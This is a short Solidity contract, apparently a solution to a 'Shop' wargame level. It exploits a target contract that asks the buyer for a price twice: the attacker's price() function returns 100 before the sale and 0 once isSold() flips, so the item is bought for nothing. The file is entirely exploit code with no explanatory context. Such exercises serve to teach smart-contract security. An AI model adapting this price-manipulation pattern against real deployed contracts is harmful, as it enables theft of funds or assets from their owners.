// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import './Shop.sol';

contract ShopAttack {
    Shop public shop; 
    
    constructor(address _shop) public payable {
        shop = Shop(_shop);
    }
    
    function buy() public {
        shop.buy();
    }
    
    function price() public view returns(uint) {
        return shop.isSold() ? 0 : 100; // return 0 if true an 100 if false
    }
}